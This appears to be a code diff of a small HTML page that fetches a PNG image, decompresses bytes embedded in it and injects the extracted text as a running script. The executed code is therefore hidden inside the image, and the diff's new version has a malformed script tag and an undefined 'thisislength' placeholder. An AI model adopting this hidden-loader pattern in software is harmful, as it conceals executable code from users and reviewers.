@@ -1,6 +1,46 @@
-<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>thisisemoji</title></head><body><script>
-fetch('thisisimage.png').then(q=>{q.arrayBuffer().then(a=>{new Response(new Blob([new Blob([new Uint8Array(a)]).slice(41,-16)],{type:"application/zlib"}).stream().pipeThrough(new DecompressionStream("deflate"))).arrayBuffer().then(b=>{let x=''
-for(let i=710450;i<b.byteLength;i+=5465){x+=new TextDecoder().decode(b.slice(i+1,i+5465))}let s=(document.createElement("script"))
-s.appendChild(document.createTextNode(x))
-document.body.appendChild(s)
-})})})</script></body></html>
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>thisisemoji</title>
+</head>
+
+<body>
+  <script src="https://cdn.jsdelivr.net/npm/fzstd@0.1.1/umd/index.js" 
+  integrity="sha512-9xkDKNSKtCn/6zLYEVT1Muu1KuZsFVFeoYggLPShyi1FSHSiLG2tTQ3Qt8k8JC7Wiu9jCprdZeHgUQo5fPq3ng==" 
+  crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/fflate@0.8.2/umd/index.js">
+  integrity="sha512-8l6PLZDUdQBuIjsM0vEKUCup9KP+EsB6NlvUtFrDneI1JoIvIJGmxIoiq0qnA31BeKdAwYcTk0TQg71AX9HgRA==" 
+  crossorigin="anonymous"></script>
+  <script>
+  fetch("thisisimage.png").then((q) => {
+  q.arrayBuffer().then((a) => {
+    let l = fflate.unzlibSync(new Uint8Array(a.slice(41, -16))),
+      f = 0,
+      p = 0,
+      r = 0,
+      u = new Uint8Array(l.length);
+    do {
+      if (r == 1024 || f == 0) {
+        f++;
+        r = 0;
+      } else {
+        u[p] = l[f];
+        r++;
+        f++;
+        p++;
+      }
+    } while (f < l.length);
+    let z = fzstd.decompress(u.slice(7 * 1024, 7 * 1024 + thisislength)),
+      s = document.createElement("script");
+    s.appendChild(document.createTextNode(new TextDecoder().decode(z)));
+    document.body.appendChild(s);
+  });
+}); 
+  
+</script>
+</body>
+
+</html>
